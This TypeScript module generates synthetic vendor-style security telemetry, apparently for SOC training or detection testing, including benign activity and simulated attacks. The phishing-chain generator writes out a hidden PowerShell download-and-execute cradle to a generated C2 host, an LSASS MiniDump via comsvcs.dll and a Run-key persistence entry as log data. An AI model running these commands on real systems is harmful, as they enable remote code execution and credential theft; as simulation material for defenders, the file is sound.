/**
 * Per-source realistic telemetry generators.
 *
 * Output mirrors what real vendors produce:
 *  - CrowdStrike Falcon / Sysmon - process_create with full process tree, command line, sha256
 *  - Palo Alto / pfSense / FortiGate - net_connection with src/dst, action, bytes
 *  - Microsoft 365 UAL - sign-ins, MFA, mailbox rules
 *  - Active Directory 4624/4625/4768/4776
 *  - Okta - system log
 *  - DNS / Proxy / CloudTrail
 */

import { Identity, SERVERS, COMPANY } from "./identities";
import { makePublicIp, makeSha256, makePhishingUrl, ATTACK_COUNTRIES, KNOWN_GOOD_DOMAINS } from "./iocs";
import { rng, pick, intBetween, hashString } from "./rng";
import type { TelemetryEvent, EventType, LogSource } from "./types";

let _id = 0;
const nextId = () => `evt_${(++_id).toString(36)}_${Date.now().toString(36)}`;

function isoAt(baseEpoch: number, offsetSec: number): string {
  return new Date(baseEpoch + offsetSec * 1000).toISOString();
}

// ---------- EDR / Sysmon process_create ----------

const COMMON_PROCESSES = [
  { name: "chrome.exe",        path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" },
  { name: "msedge.exe",        path: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" },
  { name: "OUTLOOK.EXE",       path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" },
  { name: "WINWORD.EXE",       path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" },
  { name: "EXCEL.EXE",         path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" },
  { name: "Teams.exe",         path: "C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" },
  { name: "explorer.exe",      path: "C:\\Windows\\explorer.exe" },
];

const SYSTEM_PROCESSES = [
  { name: "svchost.exe",   path: "C:\\Windows\\System32\\svchost.exe" },
  { name: "lsass.exe",     path: "C:\\Windows\\System32\\lsass.exe" },
  { name: "services.exe",  path: "C:\\Windows\\System32\\services.exe" },
  { name: "wininit.exe",   path: "C:\\Windows\\System32\\wininit.exe" },
  { name: "smss.exe",      path: "C:\\Windows\\System32\\smss.exe" },
];

export function genBenignEdr(user: Identity, base: number, count: number, seed = 1): TelemetryEvent[] {
  const r = rng(seed ^ hashString(user.username));
  const out: TelemetryEvent[] = [];
  for (let i = 0; i < count; i++) {
    const proc = pick(r, COMMON_PROCESSES);
    out.push({
      id: nextId(),
      ts: isoAt(base, intBetween(r, -3600, 3600)),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: user.hostname,
      user_email: user.email,
      process: {
        name: proc.name, pid: intBetween(r, 1000, 9999),
        parent_name: "explorer.exe", parent_pid: intBetween(r, 800, 999),
        cmdline: `"${proc.path.replace("{u}", user.username)}"`,
        user: `${COMPANY.ad_domain}\\${user.username}`,
        integrity: "medium",
      },
      file: { path: proc.path.replace("{u}", user.username), sha256: makeSha256(proc.name) },
      severity: "informational",
      raw: { event_id: 4688, channel: "Security" },
    });
  }
  return out;
}

// Malicious process tree - phishing payload chain
export function genPhishingChain(user: Identity, base: number, seed: number): TelemetryEvent[] {
  const r = rng(seed);
  const tempPath = `C:\\Users\\${user.username}\\AppData\\Local\\Temp`;
  const docPath  = `C:\\Users\\${user.username}\\Downloads\\Invoice-Q3-2026.docm`;
  const lnkPath  = `${tempPath}\\sxw_${Math.floor(r()*1e6).toString(16)}.lnk`;
  const dllPath  = `${tempPath}\\sxw_${Math.floor(r()*1e6).toString(16)}.dll`;
  const c2 = `https://${pick(r, ["telemetry-api","sync-worker","cdn-static-edge"])}-${Math.floor(r()*1e5).toString(16)}.${pick(r, ["xyz","top","cyou"])}/api/v1/checkin`;

  const evs: TelemetryEvent[] = [];
  let t = 0;

  // 1. OUTLOOK opens attachment -> spawns WINWORD
  evs.push({
    id: nextId(), ts: isoAt(base, t += 0),
    source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
    hostname: user.hostname, user_email: user.email,
    process: {
      name: "WINWORD.EXE", pid: 4821,
      parent_name: "OUTLOOK.EXE", parent_pid: 3110,
      cmdline: `"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "${docPath}"`,
      user: `${COMPANY.ad_domain}\\${user.username}`, integrity: "medium",
    },
    file: { path: docPath, sha256: makeSha256(docPath), size: 184234 },
    mitre_technique: "T1566.001", severity: "high",
    raw: { event_id: 1, channel: "Microsoft-Windows-Sysmon/Operational" },
  });

  // 2. WINWORD spawns powershell
  evs.push({
    id: nextId(), ts: isoAt(base, t += 6),
    source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
    hostname: user.hostname, user_email: user.email,
    process: {
      name: "powershell.exe", pid: 5102,
      parent_name: "WINWORD.EXE", parent_pid: 4821,
      cmdline: `powershell.exe -NoP -W Hidden -Enc ${btoaSafe(`IEX(New-Object Net.WebClient).DownloadString('${c2}')`)}`,
      user: `${COMPANY.ad_domain}\\${user.username}`, integrity: "medium",
    },
    mitre_technique: "T1059.001", severity: "critical",
    raw: { event_id: 1, suspicious_parent: true, encoded_command: true },
  });

  // 3. PowerShell makes outbound HTTPS to C2
  evs.push({
    id: nextId(), ts: isoAt(base, t += 2),
    source: "firewall", vendor: "Palo Alto NGFW", event_type: "net_connection",
    hostname: user.hostname, user_email: user.email,
    src_ip: user.ip, dst_ip: makePublicIp(r), src_port: intBetween(r, 49152, 65535), dst_port: 443, protocol: "tcp",
    network: { url: c2, domain: new URL(c2).hostname, method: "GET", status: 200, bytes_out: 1284, bytes_in: 28491 },
    mitre_technique: "T1071.001", severity: "high",
    raw: { action: "allow", rule: "Outbound-Web", category: "uncategorized" },
  });

  // 4. PowerShell drops LNK + DLL for persistence
  evs.push({
    id: nextId(), ts: isoAt(base, t += 4),
    source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
    hostname: user.hostname, user_email: user.email,
    process: { name: "powershell.exe", pid: 5102, cmdline: "(see prior event)", user: `${COMPANY.ad_domain}\\${user.username}` },
    file: { path: dllPath, sha256: makeSha256(dllPath), size: 451584 },
    mitre_technique: "T1027", severity: "high",
    raw: { event_id: 11 },
  });

  // 5. rundll32.exe loads attacker DLL
  evs.push({
    id: nextId(), ts: isoAt(base, t += 1),
    source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
    hostname: user.hostname, user_email: user.email,
    process: {
      name: "rundll32.exe", pid: 6044,
      parent_name: "powershell.exe", parent_pid: 5102,
      cmdline: `rundll32.exe ${dllPath},DllRegisterServer`,
      user: `${COMPANY.ad_domain}\\${user.username}`, integrity: "medium",
    },
    file: { path: dllPath, sha256: makeSha256(dllPath) },
    mitre_technique: "T1218.011", severity: "high",
    raw: { event_id: 1 },
  });

  // 6. Registry Run key persistence
  evs.push({
    id: nextId(), ts: isoAt(base, t += 3),
    source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
    hostname: user.hostname, user_email: user.email,
    process: { name: "rundll32.exe", pid: 6044, cmdline: `rundll32.exe ${dllPath},DllRegisterServer`, user: `${COMPANY.ad_domain}\\${user.username}` },
    mitre_technique: "T1547.001", severity: "high",
    raw: {
      event_id: 13,
      target_object: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
      details: `rundll32.exe ${dllPath},DllRegisterServer`,
    },
  });

  // 7. Credential Access - LSASS access
  evs.push({
    id: nextId(), ts: isoAt(base, t += 12),
    source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
    hostname: user.hostname, user_email: user.email,
    process: {
      name: "rundll32.exe", pid: 6044,
      parent_name: "powershell.exe", parent_pid: 5102,
      cmdline: `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 ${tempPath}\\m.bin full`,
      user: `${COMPANY.ad_domain}\\${user.username}`, integrity: "high",
    },
    mitre_technique: "T1003.001", severity: "critical",
    raw: { event_id: 10, target_image: "C:\\Windows\\System32\\lsass.exe", granted_access: "0x1410" },
  });

  return evs;
}

// ---------- AD / Identity ----------

export function genAdAuth(user: Identity, base: number, success: boolean, seed: number): TelemetryEvent {
  const r = rng(seed);
  return {
    id: nextId(),
    ts: isoAt(base, 0),
    source: "ad", vendor: "Active Directory", event_type: success ? "auth_success" : "auth_failure",
    hostname: pick(r, SERVERS.filter(s => s.role === "domain_controller")).name,
    user_email: user.email,
    src_ip: user.ip,
    severity: success ? "informational" : "low",
    raw: {
      event_id: success ? 4624 : 4625,
      logon_type: 3,
      authentication_package: "Kerberos",
      target_user_name: user.username,
      workstation: user.hostname,
      failure_reason: success ? undefined : "Unknown user name or bad password",
    },
  };
}

export function genPasswordSpray(target_users: Identity[], base: number, seed: number): TelemetryEvent[] {
  const r = rng(seed);
  const attackerIp = makePublicIp(r);
  const out: TelemetryEvent[] = [];
  let t = 0;
  for (const u of target_users) {
    out.push({
      id: nextId(), ts: isoAt(base, t += intBetween(r, 8, 22)),
      source: "okta", vendor: "Okta", event_type: "auth_failure",
      user_email: u.email, src_ip: attackerIp,
      severity: "medium", mitre_technique: "T1110.003",
      raw: {
        event: "user.session.start",
        result: "FAILURE",
        outcome_reason: "VERIFICATION_ERROR",
        client_geo: { country: pick(r, ATTACK_COUNTRIES), city: "Unknown" },
        user_agent: "Mozilla/5.0 (X11; Linux x86_64) python-requests/2.31.0",
      },
    });
  }
  // One success indicating compromise
  const victim = pick(r, target_users);
  out.push({
    id: nextId(), ts: isoAt(base, t += intBetween(r, 30, 90)),
    source: "okta", vendor: "Okta", event_type: "auth_success",
    user_email: victim.email, src_ip: attackerIp,
    severity: "high", mitre_technique: "T1078",
    raw: {
      event: "user.session.start", result: "SUCCESS",
      mfa: victim.mfa ? "satisfied_via_push_fatigue" : "not_required",
      client_geo: { country: pick(r, ATTACK_COUNTRIES) },
    },
  });
  return out;
}

// ---------- O365 / Exchange ----------

export function genPhishingEmail(user: Identity, base: number, seed: number): TelemetryEvent {
  const r = rng(seed);
  const sender = `accounting@${pick(r, ["fin-svc-portal.xyz","ms-billing-secure.top","invoice-gateway.cyou"])}`;
  return {
    id: nextId(), ts: isoAt(base, 0),
    source: "o365", vendor: "Microsoft Defender for O365", event_type: "email_received",
    user_email: user.email,
    severity: "medium", mitre_technique: "T1566.001",
    raw: {
      sender,
      subject: pick(r, [
        "Re: Wire transfer confirmation - URGENT",
        "Quarterly invoice attached - action required",
        "Your DocuSign envelope: Q3 budget review",
        "[ACTION] Vendor banking details update",
      ]),
      attachment: { name: "Invoice-Q3-2026.docm", sha256: makeSha256("phish-doc"), size: 184234 },
      spf: "fail", dkim: "none", dmarc: "fail",
      verdict: "phish", delivery_action: "Delivered",
    },
  };
}

// ---------- DNS / Proxy ----------

export function genDnsQueries(user: Identity, base: number, count: number, seed: number): TelemetryEvent[] {
  const r = rng(seed);
  const out: TelemetryEvent[] = [];
  for (let i = 0; i < count; i++) {
    const dom = pick(r, KNOWN_GOOD_DOMAINS);
    out.push({
      id: nextId(),
      ts: isoAt(base, intBetween(r, -3600, 3600)),
      source: "dns", vendor: "Internal Resolver", event_type: "dns_query",
      hostname: user.hostname, user_email: user.email,
      src_ip: user.ip, dst_ip: "10.30.0.53",
      network: { domain: dom },
      severity: "informational",
      raw: { qtype: "A", rcode: "NOERROR" },
    });
  }
  return out;
}

export function genDnsTunneling(user: Identity, base: number, count: number, seed: number): TelemetryEvent[] {
  const r = rng(seed);
  const out: TelemetryEvent[] = [];
  const c2 = `c2-${Math.floor(r() * 1e5).toString(16)}.${pick(r, ["xyz","top","cf"])}`;
  for (let i = 0; i < count; i++) {
    // Long high-entropy subdomain encoded as base32-ish
    const noise = Array.from({ length: 48 }, () => "abcdefghijklmnopqrstuvwxyz234567"[Math.floor(r()*32)]).join("");
    out.push({
      id: nextId(), ts: isoAt(base, i * 4),
      source: "dns", vendor: "Internal Resolver", event_type: "dns_query",
      hostname: user.hostname, user_email: user.email,
      src_ip: user.ip, dst_ip: "10.30.0.53",
      network: { domain: `${noise}.${c2}` },
      mitre_technique: "T1071.004", severity: "high",
      raw: { qtype: "TXT", rcode: "NOERROR", response_size: intBetween(r, 240, 480) },
    });
  }
  return out;
}

// ---------- VPN ----------

export function genVpnLogin(user: Identity, base: number, country: string, seed: number): TelemetryEvent {
  const r = rng(seed);
  return {
    id: nextId(), ts: isoAt(base, 0),
    source: "vpn", vendor: "Cisco AnyConnect", event_type: "vpn_login",
    user_email: user.email,
    src_ip: makePublicIp(r),
    severity: country === "US" ? "informational" : "high",
    mitre_technique: country === "US" ? undefined : "T1078",
    raw: {
      tunnel_group: "RemoteAccess",
      assigned_ip: `10.40.${intBetween(r, 0, 50)}.${intBetween(r, 1, 254)}`,
      client_geo: { country, city: country === "US" ? "San Jose" : "Unknown" },
      duration_min: intBetween(r, 15, 480),
    },
  };
}

// ---------- Cloud (CloudTrail) ----------

export function genCloudTrailExfil(user: Identity, base: number, seed: number): TelemetryEvent[] {
  const r = rng(seed);
  const out: TelemetryEvent[] = [];
  const bucket = `cryotech-fin-${Math.floor(r()*1e4).toString(16)}`;
  out.push({
    id: nextId(), ts: isoAt(base, 0),
    source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
    user_email: user.email,
    severity: "medium",
    raw: {
      eventName: "ListBuckets", eventSource: "s3.amazonaws.com",
      sourceIPAddress: user.ip, userAgent: "aws-cli/2.13.5 Python/3.11",
      requestParameters: {}, responseElements: null,
    },
  });
  out.push({
    id: nextId(), ts: isoAt(base, 60),
    source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
    user_email: user.email,
    severity: "high", mitre_technique: "T1567.002",
    raw: {
      eventName: "GetObject", eventSource: "s3.amazonaws.com",
      sourceIPAddress: user.ip,
      requestParameters: { bucketName: bucket, key: "exports/customers-2026-Q3.csv" },
      additionalEventData: { bytesTransferredOut: 184392112 },
    },
  });
  return out;
}

// helper - safe base64 for both server & browser
function btoaSafe(s: string): string {
  if (typeof btoa === "function") return btoa(s);
  // @ts-ignore
  return Buffer.from(s, "utf8").toString("base64");
}
